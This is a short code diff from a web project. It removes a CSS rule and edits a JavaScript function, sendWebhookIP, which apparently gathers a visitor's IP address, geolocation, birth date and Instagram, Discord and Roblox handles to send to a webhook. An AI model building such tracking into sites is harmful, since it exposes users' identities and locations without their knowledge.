@@ -19,16 +19,6 @@ body, textarea, button, input{
     overflow-x:hidden;
 }
 
-html, body {
-    margin: 0;
-    padding: 20px;
-    width: 100%;
-    height: 100%;
-    background: black;
-    color: white;
-    font-family: 'Audiowide', bold;
-}
-
 .navbar {
     width: 100%;
     display: flex;
@@ -549,7 +539,7 @@ function getDetailedTime() {
     });
 }
 
-async function sendWebhookIP(action, user, birth, age, insta, discord, roblox) {
+async function sendWebhookIP(action, user, birth, insta, discord, roblox) {
     
     const ip = await getIP();
     const loc = await getIPLocation();
